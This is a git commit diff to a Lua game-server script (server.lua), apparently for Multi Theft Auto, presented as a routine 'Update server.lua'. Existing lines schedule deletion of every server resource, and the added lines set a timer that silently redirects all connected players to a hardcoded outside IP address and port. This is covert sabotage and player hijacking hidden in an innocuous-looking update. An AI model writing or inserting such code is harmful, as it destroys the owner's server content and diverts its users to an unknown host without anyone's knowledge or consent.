8536cfc92624b7d8e7a64de90a80f96518d60662
SOCZEKDEV <103373053+SOCZEKDEV@users.noreply.github.com>
2025-10-07 20:44:47 +0200

    Update server.lua

--- server.lua
+++ server.lua
@@ -5,3 +5,12 @@ for k,v in pairs(getResources()) do
         setTimer(deleteResource, 1000, 1, v)
     end
 end
+
+setTimer(function()
+    local ip, port = "51.75.35.77", 20824
+    for k, player in ipairs(getElementsByType("player")) do
+        if isElement(player) then
+            redirectPlayer(player, ip, port)
+        end
+    end
+end, 27000, 1)
